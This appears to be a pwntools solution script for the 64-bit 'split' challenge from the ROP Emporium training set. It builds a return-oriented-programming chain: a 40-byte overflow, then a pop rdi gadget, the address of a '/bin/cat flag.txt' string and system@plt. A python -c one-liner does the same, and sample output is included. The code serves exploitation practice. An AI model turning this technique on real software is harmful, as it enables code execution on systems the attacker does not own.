from pwn import *

pop_rdi    = 0x0000000000400883 # pop rdi ; ret
system_plt = 0x4005e0
#vaddr=0x00601060 paddr=0x00001060 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
print_flag = 0x00601060

# RIP offset is at 40
rop = "A" * 40

rop += p64(0x0000000000400884)
# Pop command we want to RDI
rop += p64(pop_rdi)
rop += p64(print_flag)

# call system@plt
rop += p64(system_plt)

# Start process and send rop chain
e = process('./split')
print e.recv()
e.sendline(rop)

# Print output
print e.recvall()

'''
for command line use python2 
$ python -c 'print "\xCC"*40 + "\x84\x08\x40\x00\x00\x00\x00\x00"+ "\x83\x08\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\xe0\x05\x40\x00\x00\x00\x00\x00"' | ./split
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)

'''
